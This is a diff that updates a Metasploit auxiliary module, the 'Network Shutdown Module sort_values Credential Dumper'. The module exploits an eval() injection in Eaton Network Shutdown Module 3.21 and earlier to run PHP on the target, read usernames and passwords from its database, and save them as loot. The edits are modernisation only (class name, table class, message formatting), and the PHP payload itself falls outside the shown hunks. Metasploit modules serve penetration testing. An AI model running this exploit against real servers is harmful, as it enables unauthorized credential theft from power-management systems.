@@ -1,23 +1,22 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Network Shutdown Module <= 3.21 (sort_values) Credential Dumper',
+      'Name'           => 'Network Shutdown Module sort_values Credential Dumper',
       'Description'    => %q{
-        This module will extract user credentials from Network Shutdown Module by exploiting
-        a vulnerability found in lib/dbtools.inc, which uses unsanitized user input inside a
-        eval() call.  Please note that in order to extract credentials,the vulnerable service
-        must have at least one USV module (an entry in the "nodes" table in mgedb.db)
+        This module will extract user credentials from Network Shutdown Module
+        versions 3.21 and earlier by exploiting a vulnerability found in
+        lib/dbtools.inc, which uses unsanitized user input inside a eval() call.
+        Please note that in order to extract credentials, the vulnerable service
+        must have at least one USV module (an entry in the "nodes" table in
+        mgedb.db).
       },
       'References'     =>
         [
@@ -36,7 +35,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(4679)
-      ], self.class)
+      ])
   end
 
   def execute_php_code(code, opts = {})
@@ -76,11 +75,11 @@ class Metasploit3 < Msf::Auxiliary
     } die();
     EOT
 
-    print_status("#{peer} - Reading user credentials from the database")
+    print_status("Reading user credentials from the database")
     response = execute_php_code(php)
 
     if not response or response.code != 200 then
-      print_error("#{peer} - Failed: Error requesting page")
+      print_error("Failed: Error requesting page")
       return
     end
 
@@ -91,12 +90,12 @@ class Metasploit3 < Msf::Auxiliary
   def run
     credentials = read_credentials
     if credentials.empty?
-      print_warning("#{peer} - No credentials collected.")
-      print_warning("#{peer} - Sometimes this is because the server isn't in the vulnerable state.")
+      print_warning("No credentials collected.")
+      print_warning("Sometimes this is because the server isn't in the vulnerable state.")
       return
     end
 
-    cred_table = Rex::Ui::Text::Table.new(
+    cred_table = Rex::Text::Table.new(
       'Header'  => 'Network Shutdown Module Credentials',
       'Indent'  => 1,
       'Columns' => ['Username', 'Password']
@@ -114,6 +113,6 @@ class Metasploit3 < Msf::Auxiliary
     loot_filename = "eaton_nsm_creds.csv"
     loot_desc     = "Eaton Network Shutdown Module Credentials"
     p = store_loot(loot_name, loot_type, datastore['RHOST'], cred_table.to_csv, loot_filename, loot_desc)
-    print_status("Credentials saved in: #{p.to_s}")
+    print_good("Credentials saved in: #{p.to_s}")
   end
 end
